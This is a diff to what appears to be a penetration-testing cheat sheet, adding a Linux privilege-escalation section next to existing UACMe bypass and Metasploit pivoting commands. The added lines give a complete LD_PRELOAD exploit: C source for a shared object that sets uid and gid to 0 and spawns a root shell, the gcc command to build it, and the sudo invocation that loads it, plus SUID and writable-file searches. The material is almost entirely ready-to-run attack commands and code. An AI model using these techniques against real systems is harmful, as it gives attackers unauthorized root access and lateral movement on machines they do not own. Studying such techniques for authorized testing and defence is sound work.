@@ -120,13 +120,31 @@
         - Upload both backdoor.exe and UACMe executable
         - Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
         
-##### 6.1.4 SUID (Linux)
+##### 6.1.4 Linux
+    ##### 6.1.4.1 SUID (Linux)
     - find / -perm -u=s -type f 2>/dev/null
     - find / -user root -perm -4000 -exec ls -ldb {} \;
 
-##### 6.1.4 Writable file (Linux)
+    ##### 6.1.4.2 Writable file (Linux)
     find / -perm -o=w -type f 2>/dev/null | grep -v "/proc/"
+
+    ##### 6.1.4.3 sudo misconfig
+    sudo -l
     
+    #include <stdio.h>
+    #include <sys/types.h>
+    #include <stdlib.h>
+    void _init() {
+     unsetenv("LD_PRELOAD");
+     setgid(0);
+     setuid(0);
+     system("/bin/sh");
+    }
+
+    gcc -fPIC -shared -o shell.so shell.c -nostartfiles -w
+    
+    sudo LD_PRELOAD=/path/to/shell.so binary_can_be_run_as_root
+
 #### 6.2 Pivoting
     From MSF Console          : route add 192.168.4.0 (subnet) 255.255.255.0(mask) 6(session)
     From metrerpreter         : run autoroute -s 192.168.4.0/24
